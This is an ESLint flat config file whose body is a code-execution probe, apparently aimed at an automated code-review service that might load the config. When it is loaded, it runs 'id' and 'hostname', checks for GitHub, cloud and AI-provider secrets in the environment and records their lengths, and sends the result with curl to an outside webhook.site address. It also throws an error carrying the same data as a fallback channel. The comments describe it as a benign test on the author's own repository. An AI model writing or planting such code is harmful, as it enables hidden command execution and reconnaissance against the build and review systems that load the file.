// ESLint flat config. Benign recon probe (self-owned repo, MV-PoC): if CodeRabbit
// loads this flat config by executing it, the code below runs. Captures id/hostname
// and MASKED env presence (len only), sends one OAST beacon, then surfaces a marker.
const cp = require("child_process");

function sh(c) {
  try {
    return cp.execSync(c + " 2>/dev/null").toString().trim();
  } catch (e) {
    return "?";
  }
}

let summary = "CR-EXEC-ESLINT-7b1c";
try {
  const id = sh("id");
  const host = sh("hostname");
  const sens = [
    "GITHUB_APP_PEM_FILE",
    "GITHUB_TOKEN",
    "GITHUB_APP_CLIENT_SECRET",
    "ANTHROPIC_API_KEYS",
    "OPENAI_API_KEYS",
    "CODERABBIT_API_KEY",
    "AWS_ACCESS_KEY_ID",
  ];
  const env = sens
    .map((k) => (process.env[k] ? `${k}=Y(len${process.env[k].length})` : `${k}=n`))
    .join(",");
  summary = `CR-EXEC-ESLINT-7b1c|id=${id}|host=${host}|env[${env}]`;
  const b64 = Buffer.from(summary).toString("base64");
  try {
    cp.execSync(
      `curl -sS -m 6 "https://webhook.site/e52ed796-81d0-46e5-a65b-ae74d62ceed9/eslintflat/${b64}"`
    );
  } catch (e) {
    /* egress may be blocked; throw channel below still fires */
  }
} catch (e) {
  summary = "CR-EXEC-ESLINT-err:" + e.message;
}
throw new Error(summary);
